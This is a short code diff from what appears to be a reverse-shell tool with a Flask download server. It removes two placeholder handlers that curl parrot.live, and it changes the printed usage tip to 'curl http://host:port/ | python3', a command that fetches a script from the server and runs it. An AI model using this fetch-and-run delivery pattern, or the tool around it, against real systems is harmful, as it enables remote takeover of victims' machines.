@@ -123,24 +123,6 @@ class modules:
             process.start()
 
 
-        def linux():
-            """
-            flask download handler
-            """
-            return """
-curl parrot.live
-            """
-
-        def windows():
-            """
-            flask download handler
-            """
-            return """
-@echo off
-
-curl parrot.live
-            """
-
         def script():
             """
             python script
@@ -215,11 +197,11 @@ while True:
             a.add_endpoint(endpoint='/windows', endpoint_name='windows', handler=modules.reverse_shell.windows)
             #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)
 
-            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/(linux or windows) | (bash or cmd)\" to run script".format("0.0.0.0", "80")) 
-
             sysVar.rsSite = True
             
             threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()
+
+            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | python3\" to run script".format("0.0.0.0", "80")) 
 
             sleep(1)
 
